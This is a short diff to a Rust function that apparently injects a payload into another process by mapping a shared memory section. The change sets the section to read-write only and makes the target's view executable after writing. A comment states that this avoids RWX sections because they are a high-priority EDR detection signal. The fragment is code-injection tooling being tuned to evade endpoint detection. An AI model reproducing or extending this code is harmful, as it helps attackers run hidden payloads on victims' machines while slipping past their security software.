@@ -6546,13 +6546,10 @@ fn inject_section_mapping(
         let aligned_size = page_align(payload.len());
         let mut large_size: i64 = aligned_size as i64;
 
-        // Section protection: PAGE_READWRITE for enhanced variant,
-        // PAGE_EXECUTE_READWRITE for standard variant.
-        let section_protection: u64 = if enhanced {
-            0x04 // PAGE_READWRITE
-        } else {
-            0x40 // PAGE_EXECUTE_READWRITE
-        };
+        let section_protection: u64 = 0x04; // PAGE_READWRITE — always
+        // Section protection is separate from view protection. The target process
+        // view is set to PAGE_EXECUTE_READ after writing. RWX sections are a
+        // high-priority EDR detection signal.
 
         // SEC_COMMIT = 0x8000000
         // SECTION_ALL_ACCESS = 0x000F001F
